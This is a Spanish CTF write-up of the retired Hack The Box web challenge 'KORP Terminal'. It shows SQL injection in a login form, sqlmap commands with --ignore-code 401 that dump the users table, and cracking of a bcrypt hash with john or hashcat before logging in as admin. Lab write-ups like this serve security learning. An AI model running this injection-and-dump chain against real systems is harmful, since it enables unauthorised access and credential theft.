---
challenge: KORP Terminal
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, bcrypt, sqlmap, cyber-apocalypse-2024]
---

# KORP Terminal — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags reales.

## TL;DR

Un login de una terminal ficticia. Una comilla simple provoca un **error de MySQL**: hay **SQL injection**. La aplicación responde **401** aunque el error se muestre, así que `sqlmap` hay que lanzarlo con `--ignore-code 401`. Se vuelca la tabla `users`, se crackea el hash **bcrypt** y se entra como `admin`.

## Evidencia

- Una instancia web con un formulario de usuario/contraseña.

## Método

1. **Confirmar la inyección**: `'` en usuario y en contraseña; el error SQL aparece en la respuesta.

2. **Automatizar ignorando el 401**:

```bash
sqlmap -r login.req --batch --ignore-code 401 --dbs
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal --tables
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal -T users --dump
```

3. **Crackear el bcrypt**:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# o: hashcat -m 3200
```

4. **Entrar** con las credenciales recuperadas: la respuesta trae la flag.

## Tropiezos

- **`--ignore-code 401`**: sin ese flag, `sqlmap` abandona al considerar el *endpoint* inaccesible.
- **`-r` con la petición completa**: conservar cabeceras y método POST; la inyección va en el cuerpo.
- **bcrypt es lento**: pocas palabras por segundo; usar solo diccionarios razonables.

## Lecciones

- Un error de base de datos visible en producción es un mapa para el atacante.
- Un código de estado engañoso no detiene la inyección: la respuesta sigue siendo válida.
- Contraseñas con bcrypt siguen cayendo si son débiles.
